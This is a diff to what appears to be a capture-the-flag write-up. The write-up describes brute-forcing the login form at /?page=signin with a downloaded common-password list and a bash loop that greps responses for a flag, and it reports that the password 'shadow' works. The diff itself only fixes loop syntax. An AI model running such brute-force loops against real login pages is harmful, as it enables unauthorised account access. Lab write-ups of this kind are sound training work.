@@ -33,6 +33,7 @@ The login form at `/?page=signin` is vulnerable to brute force attacks, allowing
   ```bash
   wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt -O pwdlist.txt
   ```
+
 - Use this brute force loop:
   ```bash
   for pwd in $(cat pwdlist.txt); do 
@@ -41,7 +42,7 @@ The login form at `/?page=signin` is vulnerable to brute force attacks, allowing
     flag=$(echo "$resp" | grep -oP 'The flag is : \K[a-f0-9]{64}')
     echo "Success! Username: admin | Password: $pwd | Flag: $flag"
     break
-  fi done
+  fi; done
   ```
 - Password `shadow` is found to work.
 
